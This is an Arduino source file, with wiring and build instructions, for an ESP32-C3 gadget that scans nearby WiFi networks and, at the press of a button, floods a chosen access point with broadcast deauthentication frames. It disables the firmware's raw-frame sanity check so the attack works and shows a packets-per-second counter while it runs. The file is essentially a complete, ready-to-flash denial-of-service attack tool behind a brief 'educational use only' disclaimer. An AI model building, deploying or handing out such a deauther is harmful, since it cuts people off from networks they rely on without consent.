/*
Made By Nelson
----LIST----
0.42 inch OLED 72*40
ESP32 C3 SuperMini
Button*1
Heatsink <Recommend> (High PKS may cause overheating; use a heatsink for better stability.)
----WIRE----
>OLED<
SCL->GPIO9
SDA->GPIO8
>BUTTON<
PIN->GND
OtherPIN->GPIO2
----USE----
Click In Scan Page To Select The WiFi.
Long Press 1.5s To Start Attack.
To end Attack,Just Long Press 1.5s in Attack Page.
----IMPORTANT: COMPILATION ERROR FIX----
If you get "multiple definition of ieee80211_raw_frame_sanity_check" error:
1. Open your Arduino hardware folder.
2. Find "platform.txt" for ESP32.
3. Add "-Wl,-zmuldefs" to the end of "compiler.c.elf.flags".
4. Restart Arduino IDE.
----DISCLAIMER----
For educational and authorized security testing only.
The author is not responsible for any misuse or damage.
Use at your own risk.
HEATSINK REQUIRED for high PKS stability.
*/
#include <Arduino.h>
#include <U8g2lib.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include <Wire.h>

#define SDA_PIN 8
#define SCL_PIN 9
#define BTN_PIN 2

U8G2_SSD1306_72X40_ER_F_HW_I2C u8g2(U8G2_R0, U8X8_PIN_NONE);

extern "C" int ieee80211_raw_frame_sanity_check(void* frame, int len) { return 0; }

enum State { SCANNING, ATTACKING };
State currentState = SCANNING;

struct AccessPoint {
  uint8_t bssid[6];
  String ssid;
  int ch;
};

AccessPoint apList[5]; 
int apCount = 0;
int selectedIdx = 0;
int scrollPos = 8;
unsigned long lastScrollTime = 0;
unsigned long btnPressStartTime = 0;
bool btnPressed = false;
uint32_t pktsSentTotal = 0;  
uint32_t pksBuffer = 0;      
uint32_t currentPks = 0;     
unsigned long lastPksReset = 0;

void performActiveScan() {
  apCount = 0;
  selectedIdx = 0;
  int n = WiFi.scanNetworks(false, true, false, 110); 
  int found = (n > 5) ? 5 : n;
  for (int i = 0; i < found; i++) {
    apList[i].ssid = WiFi.SSID(i);
    apList[i].ch = WiFi.channel(i);
    memcpy(apList[i].bssid, WiFi.BSSID(i), 6);
    apCount++;
  }
  WiFi.scanDelete();
}

void drawScrollingText(int y, String text, bool selected) {
  int textWidth = u8g2.getStrWidth(text.c_str());
  if (selected) {
    u8g2.drawStr(0, y, ">"); 
    if (textWidth > 64) {
      if (millis() - lastScrollTime > 35) {
        scrollPos--;
        if (scrollPos < (8 - textWidth)) scrollPos = 72;
        lastScrollTime = millis();
      }
      u8g2.setClipWindow(8, 0, 72, 40);
      u8g2.drawStr(scrollPos, y, text.c_str());
      u8g2.setMaxClipWindow();
    } else u8g2.drawStr(8, y, text.c_str());
  } else {
    String t = text.length() > 10 ? text.substring(0, 10) + ".." : text;
    u8g2.drawStr(8, y, t.c_str());
  }
}

void updateDisplay() {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_04b_03_tr);
  if (currentState == SCANNING) {
    u8g2.drawStr(0, 6, "--- LIST ---");
    if (apCount == 0) u8g2.drawStr(8, 22, "...");
    else for (int i = 0; i < apCount; i++) drawScrollingText(15 + (i * 7), apList[i].ssid, (i == selectedIdx));
  } else {
    u8g2.drawStr(0, 6, "RUN:");
    u8g2.setCursor(0, 15); u8g2.print(apList[selectedIdx].ssid);
    u8g2.setFont(u8g2_font_logisoso16_tn);
    u8g2.setCursor(0, 34); u8g2.printf("%u", currentPks); 
    u8g2.setFont(u8g2_font_04b_03_tr);
    u8g2.drawStr(52, 32, "PKS");
  }
  u8g2.sendBuffer();
}

void attack() {
  uint8_t p[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  memcpy(&p[10], apList[selectedIdx].bssid, 6);
  memcpy(&p[16], apList[selectedIdx].bssid, 6);
  esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, p, 26, true);
  if (err == ESP_OK) { pksBuffer++; pktsSentTotal++; }
  else { Serial.printf("[!] 0x%X\n", err); }
}

void setup() {
  Serial.begin(115200);
  Wire.begin(SDA_PIN, SCL_PIN);
  u8g2.begin();
  pinMode(BTN_PIN, INPUT_PULLUP);
  WiFi.mode(WIFI_AP_STA);
  esp_wifi_start();
  performActiveScan();
}

void loop() {
  unsigned long now = millis();
  int btn = digitalRead(BTN_PIN);
  if (btn == LOW) { if (!btnPressed) { btnPressStartTime = now; btnPressed = true; } }
  else if (btnPressed) {
    unsigned long h = now - btnPressStartTime;
    if (h >= 1500) {
      if (currentState == SCANNING && apCount > 0) {
        currentState = ATTACKING;
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_channel(apList[selectedIdx].ch, WIFI_SECOND_CHAN_NONE);
      } else {
        currentState = SCANNING;
        esp_wifi_set_promiscuous(false);
        performActiveScan();
      }
    } else if (h > 50 && currentState == SCANNING) {
      selectedIdx = (selectedIdx + 1) % apCount;
      scrollPos = 8;
    }
    btnPressed = false;
  }

  if (currentState == ATTACKING) {
    attack(); attack();
    yield();
    delay(5);//Minimum Delay is 5 ms
  }

  if (now - lastPksReset >= 1000) {
    currentPks = pksBuffer; 
    pksBuffer = 0;
    lastPksReset = now;
    if (currentState == ATTACKING) {
      Serial.printf("PKS: %u | TTL: %u\n", currentPks, pktsSentTotal);
      updateDisplay(); 
    }
  }
  if (currentState == SCANNING) updateDisplay();
}
